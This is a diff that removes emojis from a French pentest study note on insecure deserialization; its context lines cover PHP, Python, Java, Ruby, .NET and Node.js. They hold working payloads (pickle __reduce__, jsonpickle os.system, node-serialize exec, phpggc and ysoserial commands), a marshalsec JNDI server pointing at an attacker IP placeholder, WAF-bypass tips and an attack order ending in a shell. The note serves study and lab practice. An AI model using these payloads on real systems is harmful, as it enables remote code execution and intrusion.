@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🧟 Insecure Deserialization
+# Insecure Deserialization
 
 > [!info] **En 1 phrase**
 > La sérialisation transforme un objet en données (fichier, cookie, requête) ; la **désérialisation** le reconstitue.
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -35,14 +35,14 @@ flowchart LR
     D --> G[DoS / crash]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > La désérialisation **reconstitue un objet à partir de données** : elle instancie des classes et appelle des
 > méthodes avec nos valeurs. On ne peut pas définir nos propres classes côté victime, mais on peut **réutiliser
 > celles déjà chargées** (bibliothèques) et chaîner leurs méthodes → c'est la **gadget chain**.
 
 ---
 
-## 📦 Où trouve-t-on des objets sérialisés
+## Où trouve-t-on des objets sérialisés
 
 | Vecteur | Exemple | Format typique |
 |---|---|---|
@@ -55,12 +55,12 @@ flowchart LR
 | **Files uploads** | PHAR, images exif, `.rce` | PHAR, pickle |
 | **Messages / queues** | RabbitMQ, Kafka, RMI | Java serialized |
 
-> [!tip] 💡 Premier réflexe : un cookie qui **finit par `=`** (base64) et se décode en binaire étrange =
+> [!tip] Premier réflexe : un cookie qui **finit par `=`** (base64) et se décode en binaire étrange =
 > données sérialisées. Toute donnée binaire encodée en base64 est un candidat.
 
 ---
 
-## 🧬 Identifier le format (magic bytes)
+## Identifier le format (magic bytes)
 
 | Type d'objet | Header hex | Header base64 | Indices visuels |
 |---|---|---|---|
@@ -81,12 +81,12 @@ echo "cookie" | base64 -d | xxd | head -5
 #  04 08        → Ruby (Marshal)
 ```
 
-> [!warning] ⚠️ Le cookie peut être **base64 ET URL-encodé**, ou contenir un préfixe avant les données
+> [!warning] Le cookie peut être **base64 ET URL-encodé**, ou contenir un préfixe avant les données
 > (ex. `session=<base64>`, `viewstate=<base64>`). Toujours vérifier les deux.
 
 ---
 
-## 🐘 PHP — Object Injection
+## PHP — Object Injection
 
 ### Serialization basics
 
@@ -112,9 +112,9 @@ echo serialize(new User());
 
 ```php
 <?php
-// ❌ Les données du cookie sont non fiables
+// Les données du cookie sont non fiables
 $data = unserialize($_COOKIE['auth']);
-// ❌ base64 avant désérialisation
+// base64 avant désérialisation
 $data = unserialize(base64_decode($_COOKIE['auth']));
 ```
 
@@ -127,7 +127,7 @@ $data = unserialize(base64_decode($_COOKIE['auth']));
 // O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}
 ```
 
-> [!warning] ⚠️ **Les longueurs `s:N:` doivent être exactes** : changer `"user"` (4) en `"admin"` (5)
+> [!warning] **Les longueurs `s:N:` doivent être exactes** : changer `"user"` (4) en `"admin"` (5)
 > exige `s:5:` sinon `unserialize()` échoue. Privilégier des valeurs de **même longueur**.
 
 ### Object Injection via méthodes magiques
@@ -193,7 +193,7 @@ phpggc -j Laravel/RCE1 system 'id'          # JSON
 # Encodages : URL-encode, base64, échappement (selon le pipeline)
 ```
 
-> [!tip] 💡 **CVE-2016-7124 (bypass `__wakeup`)** : si `__wakeup()` vérifie nos données et qu'on veut
+> [!tip] **CVE-2016-7124 (bypass `__wakeup`)** : si `__wakeup()` vérifie nos données et qu'on veut
 > le contourner, augmenter le **nombre de propriétés déclaré** dans le payload
 > (`O:4:"Class":3:{...}` alors que l'objet en a 1) → `__wakeup()` n'est **pas** appelé (PHP < 7.4).
 
@@ -210,12 +210,12 @@ file_exists('phar://malicious.phar/test.txt');
 // php --define phar.readonly=0 build.php
 ```
 
-> [!tip] 💡 PHAR = désérialisation **sans fonction `unserialize()`** dans le code : la vuln se déclenche
+> [!tip] PHAR = désérialisation **sans fonction `unserialize()`** dans le code : la vuln se déclenche
 > via un point d'inclusion (LFI) pointant vers un fichier qu'on contrôle (upload, exif, SVG).
 
 ---
 
-## 🐍 Python — pickle / PyYAML / jsonpickle
+## Python — pickle / PyYAML / jsonpickle
 
 ### pickle (`pickle.loads`)
 
@@ -241,7 +241,7 @@ class RCE:
 payload = base64.b64encode(pickle.dumps(RCE())).decode()
 ```
 
-> [!info] 💡 `__reduce__` doit renvoyer un tuple `(callable, args)` : Python appelle `callable(*args)`
+> [!info] `__reduce__` doit renvoyer un tuple `(callable, args)` : Python appelle `callable(*args)`
 > à la désérialisation. **Jamais `pickle.loads()` sur des données non fiables.**
 
 ### PyYAML (`yaml.load`)
@@ -255,9 +255,9 @@ payload = base64.b64encode(pickle.dumps(RCE())).decode()
 
 ```py
 import yaml
-yaml.load(data)          # ❌ unsafe → RCE
-yaml.load(data, Loader=yaml.UnsafeLoader)  # ❌
-yaml.safe_load(data)     # ✅ sûr (pas d'objets Python)
+yaml.load(data)          # unsafe → RCE
+yaml.load(data, Loader=yaml.UnsafeLoader)  #
+yaml.safe_load(data)     # sûr (pas d'objets Python)
 ```
 
 ### jsonpickle
@@ -266,15 +266,15 @@ yaml.safe_load(data)     # ✅ sûr (pas d'objets Python)
 {"py/reduce": [{"py/function": "os.system"}, ["id"], null, null, null]}
 ```
 
-> [!warning] ⚠️ jsonpickle encode les classes avec des tags `py/object`, `py/reduce`, `py/type` :
+> [!warning] jsonpickle encode les classes avec des tags `py/object`, `py/reduce`, `py/type` :
 > un `jsonpickle.decode()` sur des données non fiables peut déclencher du code (RCE / SSRF).
 
 ---
 
-## ☕ Java — ObjectInputStream & ysoserial
+## Java — ObjectInputStream & ysoserial
 
 ```java
-// ❌ Sink classique (servlet, socket RMI, session)
+// Sink classique (servlet, socket RMI, session)
 ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
 Object obj = in.readObject();   // reconstruit des objets arbitraires
 ```
@@ -342,16 +342,16 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://IP_ATTAQUANT:8000/
 # JDK ≥ 8u191 / 11 : JNDI versionné (com.sun.jndi.rmi.object.trustURLCodebase) — vérifier la version !
 ```
 
-> [!warning] ⚠️ Depuis les correctifs (com.sun.jndi.* trustURLCodebase, JEP 290), les références JNDI
+> [!warning] Depuis les correctifs (com.sun.jndi.* trustURLCodebase, JEP 290), les références JNDI
 > vers des serveurs HTTP externes sont **bloquées par défaut** sur les JDK récents. Tester la version JDK
 > avant de perdre du temps sur JNDI.
 
 ---
 
-## 💎 Ruby — Marshal
+## Ruby — Marshal
 
 ```ruby
-# ❌ Sink
+# Sink
 data = Marshal.load(untrusted_input)
 ```
 
@@ -364,13 +364,13 @@ payload = Marshal.dump(pwn)          # pwn = objet construit avec la chain
 puts Base64.strict_encode64(payload)
 ```
 
-> [!info] 💡 Les chaines Ruby fiables : **ElMariachi's Universal RCE gadget** (2016) et la **documented
+> [!info] Les chaines Ruby fiables : **ElMariachi's Universal RCE gadget** (2016) et la **documented
 > chain Rails** (lab PortSwigger "Exploiting Ruby deserialization using a documented gadget chain")
 > basée sur `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` → `ERB` → `eval`.
 
 ---
 
-## 🪟 .NET — BinaryFormatter / JSON.NET / ViewState
+## .NET — BinaryFormatter / JSON.NET / ViewState
 
 ### BinaryFormatter (magic `00 01 00 00 00 FF FF FF FF` / base64 `AAEAAAD`)
 
@@ -414,7 +414,7 @@ puts Base64.strict_encode64(payload)
 
 ---
 
-## 🟩 Node.js — node-serialize
+## Node.js — node-serialize
 
 ```js
 // Cookie/param contenant du JSON node-serialize :
@@ -422,12 +422,12 @@ puts Base64.strict_encode64(payload)
 {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('id',function(e,s,p){console.log(s);}); }()"}
 ```
 
-> [!info] 💡 `_$$ND_FUNC$$_` est le marqueur de la lib `node-serialize` : le code entre `_$$ND_FUNC$$_`
+> [!info] `_$$ND_FUNC$$_` est le marqueur de la lib `node-serialize` : le code entre `_$$ND_FUNC$$_`
 > et `$$ND_FUNC$$_` est **évalué**. Equivalent : `eval()` sur `JSON.parse()` non fiable.
 
 ---
 
-## 🧩 Gadget Chains — pourquoi ça compte
+## Gadget Chains — pourquoi ça compte
 
 > Une **POP chain** est une séquence de méthodes **réelles** de classes existantes, déclenchées par la
 > désérialisation, qui aboutit à un appel dangereux (`system()`, `Process.start`, `eval`, `Runtime.exec`).
@@ -447,13 +447,13 @@ Caractéristiques d'un **gadget** :
 | Ruby | `Marshal.load` | gems : Rails, ActiveSupport, Tempfile/Dir |
 | .NET | constructeurs / `ObjectDataProvider` | GAC : PresentationFramework, System.Diagnostics |
 
-> [!warning] ⚠️ On n'injecte **jamais de code dans l'objet sérialisé** (à part node-serialize) : on injecte
+> [!warning] On n'injecte **jamais de code dans l'objet sérialisé** (à part node-serialize) : on injecte
 > des **données** qui font réagir des classes déjà chargées. D'où l'importance de connaître les
 > **bibliothèques** de l'application (banner, versions, stacktrace, package-lock/composer.lock).
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Point | Détail |
 |---|---|
@@ -468,7 +468,7 @@ Caractéristiques d'un **gadget** :
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger Web Security Academy — Insecure deserialization (modifying objects, gadget chains PHP/Java, PHAR, Ruby) : https://portswigger.net/web-security/all-labs#insecure-deserialization
 - Root-Me : PHP - désérialisation / Python pickle : https://www.root-me.org/
@@ -476,9 +476,9 @@ Caractéristiques d'un **gadget** :
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre de test**
+> [!tip] **Ordre de test**
 > 1. Repérer le point d'entrée (cookie base64, hidden field, param JSON).
 > 2. Décoder → identifier le format via **magic bytes** (table ci-dessus).
 > 3. Modifier à la main (PHP `s:N:`, JSON) pour confirmer l'injection → auth bypass facile.
@@ -486,34 +486,34 @@ Caractéristiques d'un **gadget** :
 > 5. Choisir la gadget chain adaptée (PHPGGC / ysoserial / chain Ruby documentée).
 > 6. Générer → encoder (base64/url) → injecter → récupérer le shell.
 
-> [!warning] ⚠️ **base64 vs raw**
+> [!warning] **base64 vs raw**
 > - Un cookie `rO0AB…` est du Java en **base64** ; `AC ED 00 05` est la version **raw**.
 > - PHP peut être **raw** (`O:4:…`) ou base64 (`Tzo0…`).
 > - Parfois le paramètre est **doublement encodé** (base64 puis URL). Toujours essayer l'inverse.
 
-> [!warning] ⚠️ **Quand ysoserial échoue**
+> [!warning] **Quand ysoserial échoue**
 > - **Version de libs** : CC1 ne marche que ≤ Java 8u71 + CC 3.1-3.2.1 → tester CC2, CC5, CC6, CC7, Beanutils1, Groovy1…
 > - Le payload généré est **binaire** : le renvoyer en base64 peut casser les octets → vérifier avec un echo/xxd.
 > - Erreur `ClassNotFound` dans la stacktrace = la bonne info (lib + version) → choisir la chaine exacte.
 > - Si aucune chaine → **JRMPClient + marshalsec** (RMI/JNDI) pour un RCE "universel" sous réserve de la version JDK.
 
-> [!warning] ⚠️ **Pièges PHP**
+> [!warning] **Pièges PHP**
 > - Les longueurs `s:N:` doivent être **exactes** (compter les caractères !).
 > - Nom de classe **insensible à la casse** ; `O:+4:…` bypass certains WAF regex.
 > - CVE-2016-7124 : fausser le nombre de propriétés pour sauter `__wakeup()`.
 > - PHAR : la désérialisation se déclenche via `file_exists()/include` sur un `phar://` — couplé à un LFI/upload.
 
-> [!warning] ⚠️ **Pièges généraux**
+> [!warning] **Pièges généraux**
 > - Un cookie signé (HMAC) ne se modifie pas — chercher la clé ailleurs.
 > - L'attaque dépend de la **version exacte** des libs : collecter les versions AVANT de générer.
 > - Node `_$$ND_FUNC$$_` = évaluation directe → c'est le seul cas où on injecte du code, pas des gadgets.
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection de commandes|🐚 Injection de commandes]]
-- [[LFI et RFI|📂 LFI / RFI]]
-- [[XXE|📄 XXE]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
+- [[Injection de commandes| Injection de commandes]]
+- [[LFI et RFI| LFI / RFI]]
+- [[XXE| XXE]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
